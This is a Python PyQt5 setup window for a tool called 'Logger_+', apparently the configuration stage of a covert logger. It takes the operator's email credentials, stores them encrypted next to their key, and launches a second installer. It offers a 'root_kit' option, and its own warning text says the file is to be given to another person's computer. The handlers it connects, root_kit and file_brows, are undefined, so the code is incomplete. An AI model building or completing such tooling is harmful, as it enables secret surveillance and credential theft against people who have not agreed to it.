# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'C:\Users\micha\OneDrive\Desktop\lo_gsetup.ui'
#
# Created by: PyQt5 UI code generator 5.13.0
#
# WARNING! All changes made in this file will be lost!


from PyQt5 import QtCore, QtGui, QtWidgets
from cryptography.fernet import Fernet
import os
import os.path
import sys
import time


class Ui_Frame(object):
    def setupUi(self, Frame):
        Frame.setObjectName("Frame")
        Frame.resize(1193, 898)
        Frame.setCursor(QtGui.QCursor(QtCore.Qt.ArrowCursor))
        self.checkBox = QtWidgets.QCheckBox(Frame)
        self.checkBox.setGeometry(QtCore.QRect(10, 10, 131, 51))
        font = QtGui.QFont()
        font.setPointSize(14)
        self.checkBox.setFont(font)
        self.checkBox.setObjectName("checkBox")
        self.checkBox_2 = QtWidgets.QCheckBox(Frame)
        self.checkBox_2.setGeometry(QtCore.QRect(10, 60, 151, 17))
        font = QtGui.QFont()
        font.setPointSize(14)
        self.checkBox_2.setFont(font)
        self.checkBox_2.setObjectName("checkBox_2")
        self.lineEdit = QtWidgets.QLineEdit(Frame)
        self.lineEdit.setGeometry(QtCore.QRect(600, 300, 321, 41))
        self.lineEdit.setObjectName("lineEdit")
        self.label = QtWidgets.QLabel(Frame)
        self.label.setGeometry(QtCore.QRect(520, 250, 271, 51))
        font = QtGui.QFont()
        font.setFamily("Palatino Linotype")
        font.setPointSize(22)
        self.label.setFont(font)
        self.label.setMouseTracking(False)
        self.label.setObjectName("label")
        self.lineEdit_2 = QtWidgets.QLineEdit(Frame)
        self.lineEdit_2.setGeometry(QtCore.QRect(600, 410, 321, 51))
        self.lineEdit_2.setObjectName("lineEdit_2")
        self.label_2 = QtWidgets.QLabel(Frame)
        self.label_2.setGeometry(QtCore.QRect(510, 370, 201, 31))
        font = QtGui.QFont()
        font.setFamily("Times New Roman")
        font.setPointSize(22)
        self.label_2.setFont(font)
        self.label_2.setObjectName("label_2")
        self.label_3 = QtWidgets.QLabel(Frame)
        self.label_3.setGeometry(QtCore.QRect(580, 110, 321, 91))
        self.label_3.setMinimumSize(QtCore.QSize(10, 20))
        self.label_3.setBaseSize(QtCore.QSize(30, 30))
        font = QtGui.QFont()
        font.setFamily("Rockwell Extra Bold")
        font.setPointSize(36)
        font.setBold(True)
        font.setWeight(75)
        self.label_3.setFont(font)
        self.label_3.setObjectName("label_3")
        self.label_4 = QtWidgets.QLabel(Frame)
        self.label_4.setGeometry(QtCore.QRect(10, 830, 1141, 61))
        self.label_4.setMinimumSize(QtCore.QSize(20, 20))
        self.label_4.setBaseSize(QtCore.QSize(10, 15))
        font = QtGui.QFont()
        font.setFamily("Segoe UI Black")
        font.setPointSize(12)
        font.setBold(True)
        font.setWeight(75)
        self.label_4.setFont(font)
        self.label_4.setCursor(QtGui.QCursor(QtCore.Qt.WaitCursor))
        self.label_4.setObjectName("label_4")
        self.pushButton = QtWidgets.QPushButton(Frame)
        self.pushButton.setGeometry(QtCore.QRect(560, 520, 391, 61))
        self.pushButton.setObjectName("pushButton")

        self.pushButton.clicked.connect(self.get_email)
        self.checkBox.stateChanged.connect(self.root_kit)
        self.checkBox_2.stateChanged.connect(self.file_brows)


        self.retranslateUi(Frame)
        QtCore.QMetaObject.connectSlotsByName(Frame)

    def retranslateUi(self, Frame):
        _translate = QtCore.QCoreApplication.translate
        Frame.setWindowTitle(_translate("Frame", "Log_+"))
        self.checkBox_2.setText(_translate("Frame", "File Reader"))
        self.lineEdit.setText(_translate("Frame", "enter your email"))
        self.label.setText(_translate("Frame", "Email:"))
        self.lineEdit_2.setText(_translate("Frame", "enter the password to your email"))
        self.label_2.setText(_translate("Frame", "Password:"))
        self.label_3.setText(_translate("Frame", "Logger_+"))
        self.label_4.setText(_translate("Frame", "WARNING: your email and password will be stored in an encrypted file on the person\'s computer that you give the logger file to."))
        self.pushButton.setText(_translate("Frame", "Submit"))

    def get_email(self):
        email = self.lineEdit.text()
        
        if '@gmail.com' in email or '@yahoo.com' in email or '@outlook.com' in email:
            
        
            password = self.lineEdit_2.text()
            key_1 = Fernet.generate_key()
            _key_1 = Fernet(key_1)
            with open('C:\\Users\\{0}\\OneDrive\\Documents\\p_t_e.key'.format(os.environ['USERNAME']), 'wb')as pas:
                pas.write(key_1)
                pas.close()
            _email = email.encode()
            _password = password.encode()
            nemail = _key_1.encrypt(_email)
            npassword = _key_1.encrypt(_password)
        
            with open('C:\\Users\\{0}\\OneDrive\\Documents\\em.encrypted'.format(os.environ['USERNAME']), 'wb')as yui:
                yui.write(nemail)
                yui.close()
            
            with open('C:\\Users\\{0}\\OneDrive\\Documents\\em_pass.encrypted'.format(os.environ['USERNAME']), 'wb')as passf:
                passf.write(npassword)
                passf.close()
            
            os.startfile('setup_2.exe')
            sys.exit()
        else:
            os.startfile('invalid_emaile.py')
            sys.exit()
if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    Frame = QtWidgets.QFrame()
    ui = Ui_Frame()
    ui.setupUi(Frame)
    Frame.show()
    sys.exit(app.exec_())
